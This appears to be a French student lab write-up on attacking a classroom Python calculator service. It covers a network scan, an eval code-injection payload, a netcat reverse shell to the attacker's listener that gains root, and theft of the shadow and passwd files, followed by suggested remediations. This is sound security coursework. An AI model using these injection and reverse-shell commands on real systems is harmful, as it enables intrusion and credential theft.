# TP 5 Linux

## *1. Reconnaissance*

**Déterminer**

L'IP a laquelle le client essaie de se co quand on le lance est 10.1.2.12.

Le port auquel il essaie de se co sur cette IP est 13337.

L'autre méthode que la lecture du code pour obtenir les infos est l'execution du code.

```
ERROR 2023-11-30 15:20:46,319 Impossible de se connecter au serveur 10.1.2.12 sur le port 13337
```

**Scanner le réseau**

Commande nmap : 

```
nmap -oN result.txt -T2 -Pn -sT -p13337 10.33.64.1/20
```

[tp5_nmap.pcapng](./Ressource/result.pcapng)

**Connectez-vous au serveur**

```
# On définit la destination de la connexion
host = '10.33.67.166'  # IP du serveur
port = 13337       
```

elle permet de faire des calculs.

## *2. Exploit*

**Injecter du code serveur**

injection
```
PS C:\Users\guill\TP-Reseau-B2> & C:/Users/guill/AppData/Local/Microsoft/WindowsApps/python3.12.exe c:/Users/guill/TP-Reseau-B2/5/client.py
Veuillez saisir une opération arithmétique : __import__('subprocess').getoutput('echo coucou')
```

Dans les log 
```
2023-11-30 16:35:59 INFO Connexion r�ussie � 10.33.67.166:13337
2023-11-30 16:36:09 INFO Message envoy� au serveur 10.33.67.166 : __import__('subprocess').getoutput('echo Bonjour Lorens comment �a va ?')
```

## *3. Reverse shell*

**Obtenez un reverse shell sur le serveur**

Sur notre PC
```
PS C:\Users\guill> ncat -l -vv -p 9999  
```

Commande injecter (log)
```
INFO Connexion reussie : 10.33.70.40:50002
INFO Message envoye au serveur 10.33.70.40 : __import__('subprocess').getoutput('yum install nc -y')
INFO Reponse recue du serveur 10.33.70.40 : b'Last metadata expiration check: 0:22:28 ago on Fri 01 Dec 2023 02:22:47 PM CET.\nPackage nmap-ncat-3:7.92-1.el9.x86_64 is already installed.\nDependencies resolved.\nNothing to do.\nComplete!'
INFO Connexion reussie : 10.33.70.40:50002
INFO Message envoye au serveur 10.33.70.40 : __import__('subprocess').getoutput('nc -e /bin/sh 10.33.76.184 9999')
```

reverse shell actif 
```
Ncat: Connection from 10.33.70.40:41324.
echo toto
toto
whoami
root
```

**Pwn**

Fichier voler :

[Shadow](./Ressource/shadow.txt)

[Passwd](./Ressource/passwd.txt)

[Code serveur](./Ressource/server.py)

Service qui tourne :

[Service](./Ressource/service.txt)

## *4. Bonus : DOS*

## *II. Remédiation*

**Proposer une remédiation dév**

Rendre le code client executable 

```
PS C:\Users\samyd> pip install pyinstaller
PS C:\Users\samyd> pyinstaller --onefile client.py 
```

[Code client modif](./Ressource/client.exe)

Code server.py : Rajoute la condition initialement présent dans client.py pour vérifier si l'imput est un nombre ou pas Attention à l'utilisation de eval() qui est dangereux

[Code Serveur modif](./Ressource/serveur_modif.py)

**Proposer une remédiation système**

Creer un utilisateur pour lancer le service qui n'a pas les droits sudo.

Bloquer toutes les sorties du firewall (sauf les sorties initier par l'utilisateur).

Configurer SELinux 

Configurer le .service